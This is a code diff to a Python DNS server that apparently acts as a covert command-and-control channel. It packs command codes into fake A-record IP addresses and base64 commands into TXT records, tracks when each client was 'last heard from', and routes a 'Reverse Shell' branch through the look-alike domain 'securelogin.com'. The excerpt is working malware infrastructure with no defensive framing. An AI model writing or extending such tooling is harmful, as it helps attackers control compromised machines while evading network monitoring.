@@ -204,7 +204,10 @@ def sendResponseC(sock, data, addr, fileName, recordType='A'):
 
     handleResponse(sock, data, addr, addressList, recordType)
 
-def sendResponseD(sock, data, addr, command):
+def sendResponseD(sock, data, addr, command, recordType='A'):
+    handleResponse(sock, data, addr, ["" + str(random.randint(1,254)) + "." + str(command) + "." + str(random.randint(1,254)) + "." + str(random.randint(1,254))], recordType)
+
+def sendResponseE(sock, data, addr, command):
     if len(command) > 300: #400 base64 chars is the max that can fit in a single TXT record, but leaving some buffer for the length bytes; if command is too long to fit in a single response, just send an error message instead of trying to split it up and reassemble on client
         print("Error: command too long for single TXT record response; split into <=300 char pieces and call sendResponseD multiple times with each piece")
         sendResponseA(sock, data, addr, 100)
@@ -249,6 +252,8 @@ def run(bind_ip=LISTEN_IP, port=53):
                     sendResponseA(sock, data, addr, 85)
                 elif (command == "service"):
                     sendResponseA(sock, data, addr, 150)
+                elif (command == "command"):
+                    sendResponseD(sock, data, addr, 65)
             else:
                 sendResponseA(sock, data, addr, 100)
         elif (domain == "securelogin.com"): #Reverse Shell
@@ -291,7 +296,7 @@ def run(bind_ip=LISTEN_IP, port=53):
             if(len(contSplit) >= 1):
                 command = contSplit[0]
                 del(contSplit[0])
-                sendResponseD(sock, data, addr, command)
+                sendResponseE(sock, data, addr, command)
             
         newContSplit = ['Last heard from: ' + (time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()))] + contSplit
         newCont = '\n'.join(newContSplit)
@@ -300,3 +305,4 @@ def run(bind_ip=LISTEN_IP, port=53):
         f.close()
 
 run()
+
